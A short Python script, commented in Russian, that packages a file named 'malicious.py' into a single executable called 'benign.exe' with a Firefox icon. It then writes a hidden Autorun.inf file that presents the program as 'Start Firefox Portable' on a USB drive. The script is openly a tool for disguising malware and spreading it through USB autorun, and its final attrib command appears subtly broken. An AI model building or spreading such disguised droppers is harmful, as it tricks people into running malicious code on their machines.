import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)
# PyInstaller собирает в данном случае единый бинарник, который удобно распространять
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile", # все в 1 файле типо, без dll
    "--clean", # очистить кэш PyInstaller
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])
# короче эта чистка нужна для того, чтобы можно было еще раз скрипт запустить
# иначе оно просто не соберется 2 раз
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
#shutil.rmtree("__pycache__")
os.remove(exename+".spec")

# создание авторан файла
'''
Формат файла примерно такой:
    (Autorun)
    Open=benign.exe
    Action=Start Firefox Portable
    Label=My USB
    Icon=benign.exe
'''
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n") # что запускать при автозапуске
    o.write("Action=Start Firefox Protable\n") # текст в диалоге автозапуска
    o.write("Label=My USB\n") # имя тома
    o.write("Icon="+exename+"\n") # иконка диска

shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system("attrib +h" \
""+os.path.join(usbdir, "Autorun.inf") + "\""
)
